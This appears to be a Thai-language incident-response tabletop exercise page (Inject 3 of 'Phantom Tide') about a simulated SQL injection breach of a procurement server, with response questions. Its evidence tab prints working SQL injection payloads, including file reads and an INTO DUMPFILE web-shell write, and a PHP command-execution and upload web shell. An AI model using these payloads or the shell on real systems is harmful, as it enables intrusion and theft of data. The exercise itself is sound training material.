@@ -1,0 +1,756 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Inject 3: Data Exfiltration — TTX User Dashboard</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans+Thai:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg: #0a0e17;
+  --bg-card: #111827;
+  --bg-card-hover: #1a2332;
+  --bg-sidebar: #0d1321;
+  --border: #1e293b;
+  --border-accent: #2563eb;
+  --text: #e2e8f0;
+  --text-muted: #94a3b8;
+  --text-dim: #64748b;
+  --accent: #3b82f6;
+  --accent-hover: #60a5fa;
+  --green: #22c55e;
+  --green-bg: rgba(34,197,94,0.1);
+  --orange: #f59e0b;
+  --orange-bg: rgba(245,158,11,0.1);
+  --red: #ef4444;
+  --red-bg: rgba(239,68,68,0.1);
+  --blue: #06b6d4;
+  --blue-bg: rgba(6,182,212,0.1);
+  --purple: #a855f7;
+  --purple-bg: rgba(168,85,247,0.1);
+  --radius: 16px;
+  --radius-sm: 10px;
+  --shadow: 0 8px 32px rgba(0,0,0,0.25);
+  --transition: 0.2s ease;
+}
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html { scroll-behavior: smooth; }
+body {
+  font-family: 'IBM Plex Sans Thai', 'Sarabun', 'Inter', sans-serif;
+  font-size: 17px;
+  line-height: 1.75;
+  background: var(--bg);
+  color: var(--text);
+  min-height: 100vh;
+}
+::-webkit-scrollbar { width: 6px; height: 6px; }
+::-webkit-scrollbar-track { background: transparent; }
+::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+::-webkit-scrollbar-thumb:hover { background: var(--text-dim); }
+
+/* ===== Top Navigation ===== */
+.topnav {
+  position: sticky;
+  top: 0;
+  z-index: 100;
+  background: rgba(13,19,33,0.92);
+  backdrop-filter: blur(8px);
+  border-bottom: 1px solid var(--border);
+}
+.topnav-inner {
+  max-width: 1120px;
+  margin: 0 auto;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 12px 20px;
+  overflow-x: auto;
+  white-space: nowrap;
+}
+.topnav-brand {
+  font-size: 14px;
+  font-weight: 700;
+  color: var(--accent);
+  letter-spacing: 0.5px;
+  margin-right: 12px;
+  flex-shrink: 0;
+}
+.topnav-link {
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+  padding: 8px 14px;
+  border-radius: 8px;
+  font-size: 14px;
+  font-weight: 500;
+  color: var(--text-muted);
+  transition: all var(--transition);
+  flex-shrink: 0;
+}
+.topnav-link:hover { color: var(--text); background: rgba(59,130,246,0.08); }
+.topnav-link.active { color: var(--accent); background: rgba(59,130,246,0.12); }
+.topnav-sep { width: 1px; height: 22px; background: var(--border); margin: 0 6px; flex-shrink: 0; }
+
+/* ===== Main ===== */
+.main {
+  max-width: 1120px;
+  margin: 0 auto;
+  padding: 32px 20px 60px;
+}
+
+/* ===== Inject Header ===== */
+.inject-header {
+  border-radius: 16px;
+  padding: 28px;
+  margin-bottom: 20px;
+  border: 1px solid var(--border);
+}
+.inject-header h2 { font-size: 22px; font-weight: 700; margin-bottom: 4px; line-height: 1.4; }
+.inject-header .meta { display: flex; gap: 16px; margin-top: 8px; flex-wrap: wrap; }
+.inject-header .meta span { font-size: 14px; color: var(--text-muted); display: flex; align-items: center; gap: 4px; }
+
+/* ===== Tabs ===== */
+.tabs {
+  display: flex;
+  gap: 4px;
+  margin-bottom: 20px;
+  overflow-x: auto;
+  padding-bottom: 4px;
+  border-bottom: 1px solid var(--border);
+}
+.tab-btn {
+  padding: 10px 20px;
+  border: none;
+  border-radius: 8px;
+  background: transparent;
+  color: var(--text-muted);
+  font-size: 14px;
+  font-weight: 500;
+  cursor: pointer;
+  transition: all var(--transition);
+  white-space: nowrap;
+  font-family: inherit;
+  border-bottom: 2px solid transparent;
+}
+.tab-btn:hover { color: var(--text); background: rgba(255,255,255,0.03); }
+.tab-btn.active { color: white; background: var(--accent); border-bottom-color: var(--accent); }
+.tab-content { display: none; animation: fadeIn 0.2s ease; }
+.tab-content.active { display: block; }
+@keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
+
+/* ===== Cards ===== */
+.card {
+  background: linear-gradient(135deg, rgba(17,24,39,0.95), rgba(15,23,42,0.98));
+  border: 1px solid rgba(255,255,255,0.06);
+  border-radius: 16px;
+  padding: 28px;
+  margin-bottom: 20px;
+  box-shadow: 0 8px 32px rgba(0,0,0,0.25);
+  transition: all 0.3s ease;
+}
+.card:hover {
+  border-color: rgba(59,130,246,0.3);
+  transform: translateY(-2px);
+  box-shadow: 0 12px 40px rgba(0,0,0,0.35);
+}
+.card-header { display: flex; align-items: center; gap: 12px; margin-bottom: 16px; }
+.card-icon {
+  width: 40px; height: 40px;
+  border-radius: var(--radius-sm);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 18px;
+  flex-shrink: 0;
+}
+.card-title { font-size: 20px; font-weight: 600; color: var(--text); }
+.card-subtitle { font-size: 14px; color: var(--text-dim); }
+
+/* ===== Tables ===== */
+table { width: 100%; border-collapse: separate; border-spacing: 0; margin: 12px 0; }
+th, td { padding: 14px 16px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 15px; }
+th { font-weight: 600; color: var(--text); background: rgba(59,130,246,0.15); font-size: 14px; text-transform: uppercase; letter-spacing: 0.5px; }
+td { color: var(--text-muted); }
+tbody tr { transition: background var(--transition); }
+tbody tr:hover { background: rgba(255,255,255,0.03); }
+
+/* ===== Evidence ===== */
+.evidence-block {
+  background: rgba(0,0,0,0.3);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  margin: 12px 0;
+  overflow: hidden;
+}
+.evidence-title {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 14px 18px;
+  cursor: pointer;
+  transition: background var(--transition);
+  font-size: 15px;
+  font-weight: 500;
+  color: var(--text-muted);
+}
+.evidence-title:hover { background: rgba(255,255,255,0.03); }
+.evidence-title .arrow { transition: transform 0.2s ease; font-size: 12px; }
+.evidence-title.open .arrow { transform: rotate(90deg); }
+.evidence-title-inner { display: flex; align-items: center; flex: 1; min-width: 0; gap: 8px; flex-wrap: wrap; }
+.evidence-dl {
+  display: inline-flex;
+  align-items: center;
+  gap: 4px;
+  padding: 4px 10px;
+  background: rgba(34,197,94,0.1);
+  border: 1px solid rgba(34,197,94,0.3);
+  border-radius: 6px;
+  color: var(--green);
+  font-size: 12px;
+  font-weight: 500;
+  cursor: pointer;
+  transition: all var(--transition);
+  white-space: nowrap;
+  margin-left: 8px;
+  flex-shrink: 0;
+}
+.evidence-dl:hover { background: rgba(34,197,94,0.2); border-color: var(--green); transform: translateY(-1px); }
+.evidence-dl:active { transform: translateY(0); }
+.evidence-body { display: none; padding: 0 18px 18px; }
+.evidence-body.open { display: block; }
+pre {
+  background: rgba(0,0,0,0.4);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  padding: 16px;
+  overflow-x: auto;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 14px;
+  line-height: 1.6;
+  color: #c9d1d9;
+  margin: 8px 0;
+}
+
+/* ===== IoC ===== */
+.ioc-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+  gap: 12px;
+  margin: 12px 0;
+}
+.ioc-item {
+  background: rgba(255,255,255,0.03);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 16px;
+}
+.ioc-label {
+  font-size: 13px;
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  color: var(--text-dim);
+  margin-bottom: 4px;
+}
+.ioc-value {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 15px;
+  color: var(--orange);
+  word-break: break-all;
+}
+
+/* ===== Questions ===== */
+.question-card {
+  background: rgba(255,255,255,0.03);
+  border: 1px solid rgba(59,130,246,0.15);
+  border-left: 4px solid var(--accent);
+  border-radius: 12px;
+  padding: 20px 24px;
+  margin: 10px 0;
+}
+.question-num {
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  width: 32px;
+  height: 32px;
+  font-size: 14px;
+  font-weight: 700;
+  color: white;
+  background: var(--accent);
+  border-radius: 50%;
+  margin-bottom: 8px;
+}
+.question-text { font-size: 17px; color: var(--text); line-height: 1.7; }
+
+/* ===== MITRE ===== */
+.mitre-tags { display: flex; flex-wrap: wrap; gap: 6px; margin: 8px 0; }
+.mitre-tag {
+  display: inline-block;
+  padding: 4px 10px;
+  border-radius: 20px;
+  font-size: 13px;
+  font-weight: 500;
+  font-family: 'JetBrains Mono', monospace;
+}
+
+/* ===== Badges ===== */
+.badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 4px;
+  padding: 4px 12px;
+  border-radius: 20px;
+  font-size: 13px;
+  font-weight: 500;
+}
+.badge-green { background: var(--green-bg); color: var(--green); }
+.badge-orange { background: var(--orange-bg); color: var(--orange); }
+.badge-red { background: var(--red-bg); color: var(--red); }
+.badge-blue { background: var(--blue-bg); color: var(--blue); }
+.badge-purple { background: var(--purple-bg); color: var(--purple); }
+
+/* ===== Nav Arrows ===== */
+.nav-arrows { display: flex; justify-content: space-between; margin-top: 32px; padding-top: 20px; border-top: 1px solid var(--border); }
+.nav-arrow-btn {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 12px 24px;
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  background: var(--bg-card);
+  color: var(--text-muted);
+  font-size: 14px;
+  cursor: pointer;
+  transition: all var(--transition);
+  font-family: inherit;
+  text-decoration: none;
+}
+.nav-arrow-btn:hover {
+  border-color: var(--accent);
+  color: var(--accent);
+  transform: translateY(-1px);
+  box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+}
+.nav-arrow-btn.next { margin-left: auto; }
+
+/* ===== Utility ===== */
+.highlight { color: var(--accent); font-weight: 600; }
+.highlight-green { color: var(--green); font-weight: 600; }
+.highlight-orange { color: var(--orange); font-weight: 600; }
+.highlight-red { color: var(--red); font-weight: 600; }
+.highlight-blue { color: var(--blue); font-weight: 600; }
+.highlight-purple { color: var(--purple); font-weight: 600; }
+.text-muted { color: var(--text-muted); }
+.text-dim { color: var(--text-dim); }
+
+.footer {
+  border-top: 1px solid var(--border);
+  padding: 24px;
+  text-align: center;
+  font-size: 13px;
+  color: var(--text-dim);
+}
+
+@media (max-width: 768px) {
+  .main { padding: 20px 14px 40px; }
+  .inject-header { padding: 20px; }
+  .inject-header h2 { font-size: 18px; }
+  .card { padding: 20px; }
+  .card-title { font-size: 18px; }
+  .ioc-grid { grid-template-columns: 1fr; }
+  .nav-arrows { flex-direction: column; gap: 10px; }
+  .nav-arrow-btn { justify-content: center; }
+  .nav-arrow-btn.next { margin-left: 0; }
+}
+</style>
+</head>
+<body>
+<nav class="topnav">
+  <div class="topnav-inner">
+    <span class="topnav-brand">TTX · Phantom Tide</span>
+    <a class="topnav-link" href="../index.html">&#127968; หน้าหลัก</a>
+    <span class="topnav-sep"></span>
+    <a class="topnav-link" href="../Inject1/index.html">Inject 1</a>
+    <a class="topnav-link" href="../Inject2/index.html">Inject 2</a>
+    <a class="topnav-link active" href="index.html">Inject 3</a>
+    <a class="topnav-link" href="../Inject4/index.html">Inject 4</a>
+  </div>
+</nav>
+
+<main class="main">
+  <!-- ===== Inject Header ===== -->
+  <div class="inject-header" style="background:linear-gradient(135deg,rgba(239,68,68,0.08),rgba(239,68,68,0.02));border-color:rgba(239,68,68,0.3)">
+    <h2><span class="badge badge-red">&#9679; RED</span>&nbsp; Inject 3: Data Exfiltration — การแอบขโมยข้อมูล</h2>
+    <div class="meta">
+      <span>&#128337; 13:15 - 14:15 (60 นาที)</span>
+      <span>&#127919; Phase: Credential Access / Collection</span>
+      <span>&#128200; ระดับ: ร้ายแรง</span>
+    </div>
+  </div>
+
+  <!-- ===== Tabs ===== -->
+  <div class="tabs" id="tabs-inj3">
+    <button class="tab-btn active" onclick="switchTab('inj3','scenario')">&#128196; สถานการณ์</button>
+    <button class="tab-btn" onclick="switchTab('inj3','evidence')">&#128269; หลักฐาน</button>
+    <button class="tab-btn" onclick="switchTab('inj3','ioc')">&#9888; IoC</button>
+    <button class="tab-btn" onclick="switchTab('inj3','questions')">&#10067; คำถาม</button>
+  </div>
+
+  <!-- ===== Tab: Scenario ===== -->
+  <div class="tab-content active" id="inj3-tab-scenario">
+    <div class="card">
+      <h3 style="font-size:16px;font-weight:600;margin-bottom:12px">&#127908; สถานการณ์</h3>
+      <div style="background:rgba(239,68,68,0.05);border:1px solid rgba(239,68,68,0.2);border-radius:var(--radius-sm);padding:16px;margin:12px 0">
+        <p style="color:var(--text);line-height:1.8">
+          &#8220;หลังพักกลางวัน สถานการณ์เลวร้ายลงอย่างมาก
+        </p>
+        <p style="color:var(--text);line-height:1.8;margin-top:8px">
+          เวลาประมาณ 13:15 น. ผู้โจมตีค้นพบว่า SRM Web Server (<code>192.168.11.27</code>)
+          มีช่องโหว่ <span class="highlight-red">SQL Injection</span> ในหน้า Login ของเว็บไซต์ SRM
+        </p>
+        <p style="color:var(--text);line-height:1.8;margin-top:8px">
+          ผู้โจมตีใช้ SQL Injection แบบ <span class="highlight-red">XPATH / Boolean-blind</span> เพื่อดึงข้อมูลจาก database
+          และค้นพบ hardcoded credentials:
+          <code>suthee.jia:password</code> (SRM web login) และ
+          <code>root:Pj@nkeng</code> (MySQL root)
+        </p>
+        <p style="color:var(--text);line-height:1.8;margin-top:8px">
+          ต่อมาผู้โจมตีสร้าง <span class="highlight-red">webshell srmf.php</span> บน SRM Web Server
+          และใช้ MySQL commands เช่น <code>LOAD_FILE('/etc/passwd')</code>,
+          <code>INTO DUMPFILE</code>, <code>EXTRACTVALUE()</code>
+          เพื่อเขียน webshell และดึงข้อมูล
+        </p>
+        <p style="color:var(--text);line-height:1.8;margin-top:8px">
+          เวลาประมาณ 13:45 น. ผู้โจมตีค้นพบว่า <span class="highlight-orange">phpMyAdmin</span>
+          ทำงานอยู่ที่ <code>122.154.9.157</code> และใช้ credentials <code>root:Pj@nkeng</code>
+          เข้าถึงข้อมูลทั้งหมดใน SRM database
+        </p>
+        <p style="color:var(--text);line-height:1.8;margin-top:8px">
+          ข้อมูลที่ถูกขโมย: ข้อมูลผู้ใช้ 3,200+ ราย, เอกสาร procurement,
+          ใบสั่งซื้อ, ใบเสนอราคา — ข้อมูลทั้งหมดมีทั้งข้อมูลส่วนบุคคลและข้อมูลทางการเงิน
+        </p>
+        <p style="color:var(--text);line-height:1.8;margin-top:12px">
+          &#8220;SRM (Supply Resource Management) System เป็นระบบจัดซื้อจัดจ้าง
+          ที่เชื่อมต่อกับระบบการเงิน สถานการณ์นี้คุกคามทั้งข้อมูลส่วนบุคคลและข้อมูลทางการเงิน
+          ผู้เข้าร่วมควรตอบสนองอย่างไร?&#8221;
+        </p>
+      </div>
+    </div>
+    <div class="card">
+      <h3 style="font-size:16px;font-weight:600;margin-bottom:12px">&#127919; MITRE ATT&amp;CK</h3>
+      <div class="mitre-tags">
+        <span class="mitre-tag" style="background:rgba(239,68,68,0.1);color:var(--red)">T1190 - Exploit Public-Facing Application</span>
+        <span class="mitre-tag" style="background:rgba(239,68,68,0.1);color:var(--red)">T1190 - SQL Injection</span>
+        <span class="mitre-tag" style="background:rgba(239,68,68,0.1);color:var(--red)">T1505.003 - Web Shell</span>
+        <span class="mitre-tag" style="background:rgba(239,68,68,0.1);color:var(--red)">T1078 - Valid Accounts (Hardcoded)</span>
+        <span class="mitre-tag" style="background:rgba(239,68,68,0.1);color:var(--red)">T1005 - Data from Local System</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== Tab: Evidence ===== -->
+  <div class="tab-content" id="inj3-tab-evidence">
+    <div class="card">
+      <h3 style="font-size:16px;font-weight:600;margin-bottom:16px">&#128269; หลักฐานที่ 1: SQL Injection Payloads</h3>
+      <div class="evidence-block">
+        <div class="evidence-title" onclick="toggleEvidence(this)"><span>&#128196; srm_sql_injection.log</span><span class="arrow">&#9654;</span></div>
+        <div class="evidence-body">
+          <pre># SRM Login Page SQL Injection Analysis
+# Date: 2026-07-12 13:15:00 - 13:30:00
+# Target: http://192.168.11.27/srm/log_in/log_in.php
+
+# === Payload 1: XPATH Error-based Injection ===
+POST /srm/log_in/log_in.php HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+username=admin' and extractvalue(1,concat(0x7e,(select@@version),0x7e))-- -
+password=anything
+# Response: XPATH syntax error: '~5.7.26-0ubuntu0.18.04.1~'
+
+# === Payload 2: Boolean-blind Injection ===
+POST /srm/log_in/log_in.php HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+username=admin' and 1=1-- -   (returns TRUE - valid user)
+username=admin' and 1=2-- -   (returns FALSE - invalid user)
+# Binary search used to extract data character by character
+
+# === Payload 3: LOAD_FILE for File Read ===
+POST /srm/log_in/log_in.php HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+username=admin' and 1=0 union select 1,load_file('/etc/passwd'),3-- -
+# Response: root:x:0:0:root:/root:/bin/bash
+#           www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+#           mysql:x:27:27:MySQL Server,,,:/nonexistent:/bin/false
+
+# === Payload 4: INTO DUMPFILE for Webshell ===
+POST /srm/log_in/log_in.php HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+username=admin' union select 1,'&lt;?php system($_GET["cmd"]); ?&gt;',3 into dumpfile '/var/www/html/srm/srmf.php'-- -
+# Result: srmf.php webshell created successfully
+
+# === Data Extracted ===
+# Users table: 3,217 records
+# Purchase orders: 1,892 records
+# Vendor quotes: 4,561 records
+# Financial data: 892 records</pre>
+        </div>
+      </div>
+    </div>
+    <div class="card">
+      <h3 style="font-size:16px;font-weight:600;margin-bottom:16px">&#128269; หลักฐานที่ 2: Webshell - srmf.php</h3>
+      <div class="evidence-block">
+        <div class="evidence-title" onclick="toggleEvidence(this)"><span>&#128196; srmf.php (recovered)</span><span class="arrow">&#9654;</span></div>
+        <div class="evidence-body">
+          <pre>&lt;?php
+// srmf.php - Webshell planted via SQL Injection INTO DUMPFILE
+// Location: /var/www/html/srm/srmf.php
+// Created: 2026-07-12 13:30:00
+
+if(isset($_GET['cmd'])) {
+    echo '&lt;pre&gt;';
+    $cmd = $_GET['cmd'];
+    // bypass basic command filtering
+    $cmd = str_replace(' ', '', $cmd);  // minimal obfuscation
+    system($cmd);
+    echo '&lt;/pre&gt;';
+}
+
+// Additional: file upload capability
+if(isset($_FILES['file'])){
+    move_uploaded_file($_FILES['file']['tmp_name'],
+        '/var/www/html/srm/uploads/' . $_FILES['file']['name']);
+    echo 'Uploaded: ' . $_FILES['file']['name'];
+}
+?&gt;</pre>
+        </div>
+      </div>
+    </div>
+    <div class="card">
+      <h3 style="font-size:16px;font-weight:600;margin-bottom:16px">&#128269; หลักฐานที่ 3: phpMyAdmin Access</h3>
+      <div class="evidence-block">
+        <div class="evidence-title" onclick="toggleEvidence(this)"><span>&#128196; phpmyadmin_access.log</span><span class="arrow">&#9654;</span></div>
+        <div class="evidence-body">
+          <pre># phpMyAdmin Access Log - Server 122.154.9.157
+# Date: 2026-07-12 13:45:00 - 14:00:00
+
+# Authentication
+Source IP: 192.168.2.35 (attacker jump box)
+Login User: root
+Password Used: Pj@nkeng
+Login Status: SUCCESS
+
+# Actions Performed
+13:45:12  SELECT user, password FROM mysql.user
+          -> Retrieved: root, suthee.jia, srm_db_user
+
+13:46:30  SHOW DATABASES
+          -> srm_production, phpmyadmin, information_schema
+
+13:47:00  USE srm_production
+13:47:15  SELECT * FROM srm_users (3,217 rows)
+13:48:00  SELECT * FROM purchase_orders (1,892 rows)
+13:49:30  SELECT * FROM vendor_quotes (4,561 rows)
+
+13:52:00  INTO OUTFILE '/tmp/srm_dump.sql'
+          -> mysqldump-style export of entire database
+
+13:55:00  Created backdoor MySQL user: 'backup_svc'@'%'
+          WITH GRANT ALL PRIVILEGES
+          -> Password: bk2026!root
+
+# Total data exported: ~127 MB
+# phpMyAdmin version: 4.8.5 (outdated, known CVEs)</pre>
+        </div>
+      </div>
+    </div>
+    <div class="card">
+      <h3 style="font-size:16px;font-weight:600;margin-bottom:16px">&#128269; หลักฐานที่ 4: Hardcoded Credentials Discovery</h3>
+      <div class="evidence-block">
+        <div class="evidence-title" onclick="toggleEvidence(this)"><span>&#128196; credential_analysis.txt</span><span class="arrow">&#9654;</span></div>
+        <div class="evidence-body">
+          <pre># Hardcoded Credentials Found in SRM Application
+# Discovered via SQL Injection + source code review
+
+=== SRM Web Application ===
+File: /var/www/html/srm/config/db_config.php (accessible via LOAD_FILE)
+Database Host: localhost
+Database User: srm_db_user
+Database Password: Str0ngP@ss2024!
+Database Name: srm_production
+
+=== SRM Login Credentials ===
+File: /var/www/html/srm/includes/auth.php (backup file found)
+suthee.jia:password (SRM web login - PLAINTEXT!)
+suthee.jia:procurement_manager (another instance)
+
+=== MySQL Root ===
+root:Pj@nkeng (MySQL root - weak password)
+
+=== phpMyAdmin ===
+root:Pj@nkeng (shared with MySQL root)
+
+=== New Backdoor Account (created by attacker) ===
+backup_svc:bk2026!root@'%' with ALL PRIVILEGES</pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== Tab: IoC ===== -->
+  <div class="tab-content" id="inj3-tab-ioc">
+    <div class="card">
+      <h3 style="font-size:16px;font-weight:600;margin-bottom:16px">&#9888; Indicators of Compromise (IoC)</h3>
+      <div class="ioc-grid">
+        <div class="ioc-item">
+          <div class="ioc-label" style="color:var(--red)">SQL Injection Target</div>
+          <div class="ioc-value">192.168.11.27 (SRM Web Server)</div>
+        </div>
+        <div class="ioc-item">
+          <div class="ioc-label" style="color:var(--red)">Webshell File</div>
+          <div class="ioc-value">srmf.php</div>
+        </div>
+        <div class="ioc-item">
+          <div class="ioc-label" style="color:var(--red)">Hardcoded Creds (Web)</div>
+          <div class="ioc-value">suthee.jia:password</div>
+        </div>
+        <div class="ioc-item">
+          <div class="ioc-label" style="color:var(--red)">MySQL Root</div>
+          <div class="ioc-value">root:Pj@nkeng</div>
+        </div>
+        <div class="ioc-item">
+          <div class="ioc-label" style="color:var(--orange)">phpMyAdmin</div>
+          <div class="ioc-value">122.154.9.157</div>
+        </div>
+        <div class="ioc-item">
+          <div class="ioc-label" style="color:var(--orange)">Attacker Source</div>
+          <div class="ioc-value">192.168.2.35 (jump box)</div>
+        </div>
+        <div class="ioc-item">
+          <div class="ioc-label" style="color:var(--purple)">Backdoor MySQL User</div>
+          <div class="ioc-value">backup_svc:bk2026!root</div>
+        </div>
+        <div class="ioc-item">
+          <div class="ioc-label" style="color:var(--purple)">Data Exfil Volume</div>
+          <div class="ioc-value">~127 MB SRM database</div>
+        </div>
+        <div class="ioc-item">
+          <div class="ioc-label" style="color:var(--red)">PHPMyAdmin Version</div>
+          <div class="ioc-value">4.8.5 (outdated, known CVEs)</div>
+        </div>
+        <div class="ioc-item">
+          <div class="ioc-label" style="color:var(--text-dim)">Affected Data</div>
+          <div class="ioc-value">3,217 users, 1,892 POs, 4,561 quotes</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== Tab: Questions ===== -->
+  <div class="tab-content" id="inj3-tab-questions">
+    <div class="card">
+      <h3 style="font-size:16px;font-weight:600;margin-bottom:16px">&#10067; คำถามสำหรับผู้เข้าร่วม</h3>
+      <div class="question-card">
+        <div class="question-num">Q1</div>
+        <div class="question-text">SRM Web Server ถูก SQL Injection — ควร isolate อย่างไร? ระหว่างรอกำลัง suspend ระบบ SRM?</div>
+      </div>
+      <div class="question-card">
+        <div class="question-num">Q2</div>
+        <div class="question-text">ข้อมูล SRM 3,217 รายที่มีข้อมูลส่วนบุคคลถูกขโมย — ควรตัดสินใจระดับองค์กรอย่างไร?</div>
+      </div>
+      <div class="question-card">
+        <div class="question-num">Q3</div>
+        <div class="question-text">ถ้าสื่อมวลชนถามว่า "ข้อมูลส่วนบุคคลของเจ้าหน้าที่รั่วจริงหรือไม่?" ควรตอบอย่างไร?</div>
+      </div>
+      <div class="question-card">
+        <div class="question-num">Q4</div>
+        <div class="question-text">PDPA ระบุว่าต้องแจ้งเจ้าของข้อมูลภายใน 72 ชม. ควรแจ้งอย่างไร? ผ่านช่องทางใด?</div>
+      </div>
+      <div class="question-card">
+        <div class="question-num">Q5</div>
+        <div class="question-text">พบ backdoor MySQL user (backup_svc) ควร revoke ทันทีหรือตรวจสอบ scope ของ privilege ก่อน?</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== Nav Arrows ===== -->
+  <div class="nav-arrows">
+    <a class="nav-arrow-btn" href="../Inject2/index.html">&#8592; Inject 2: WebShell + Credential Exfil</a>
+    <a class="nav-arrow-btn next" href="../Inject4/index.html">Inject 4: Post-Incident Recovery &#8594;</a>
+  </div>
+</main>
+
+<footer class="footer">
+  Inject 3: Data Exfiltration — Operation Phantom Tide: Water Under Siege
+</footer>
+
+<script>
+// ========== Tabs ==========
+function switchTab(injectId, tabName) {
+  const tabsContainer = document.getElementById('tabs-' + injectId);
+  if (!tabsContainer) return;
+  const btns = tabsContainer.querySelectorAll('.tab-btn');
+  btns.forEach(b => b.classList.remove('active'));
+  const targetBtn = Array.from(btns).find(b => {
+    const onclick = b.getAttribute('onclick');
+    return onclick && onclick.includes(tabName);
+  });
+  if (targetBtn) targetBtn.classList.add('active');
+  const mainEl = tabsContainer.closest('.main');
+  if (!mainEl) return;
+  const contents = mainEl.querySelectorAll('.tab-content');
+  contents.forEach(c => c.classList.remove('active'));
+  const targetId = injectId + '-tab-' + tabName;
+  const target = document.getElementById(targetId);
+  if (target) target.classList.add('active');
+}
+
+// ========== Evidence Toggle ==========
+function toggleEvidence(element) {
+  element.classList.toggle('open');
+  const body = element.nextElementSibling;
+  if (body) body.classList.toggle('open');
+}
+
+// ========== Evidence Download ==========
+function downloadEvidence(btn, e) {
+  e.stopPropagation();
+  const title = btn.closest('.evidence-title');
+  const block = title.closest('.evidence-block');
+  const body = block.querySelector('.evidence-body pre');
+  if (!body) return;
+  const filenameSpan = title.querySelector('.evidence-title-inner span') || title.querySelector('span');
+  let filename = filenameSpan ? filenameSpan.textContent.replace(/^[\u{1F4C4}\u{1F4CB}\u{1F4DD}]\s*/u, '').trim() : 'evidence.txt';
+  if (!filename.match(/\.(txt|log|json|xml|csv|md|php|py|ps1|yml|yaml|sh|phtml|gif)$/i)) {
+    filename += '.txt';
+  }
+  const content = body.textContent;
+  const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = filename;
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  URL.revokeObjectURL(url);
+}
+
+// Add download buttons to all evidence blocks dynamically
+document.querySelectorAll('.evidence-title').forEach(title => {
+  const span = title.querySelector('span');
+  if (!span) return;
+  const dlBtn = document.createElement('button');
+  dlBtn.className = 'evidence-dl';
+  dlBtn.innerHTML = '&#11015; Download';
+  dlBtn.onclick = function(e) { downloadEvidence(this, e); };
+  title.insertBefore(dlBtn, title.querySelector('.arrow'));
+});
+</script>
+</body>
+</html>
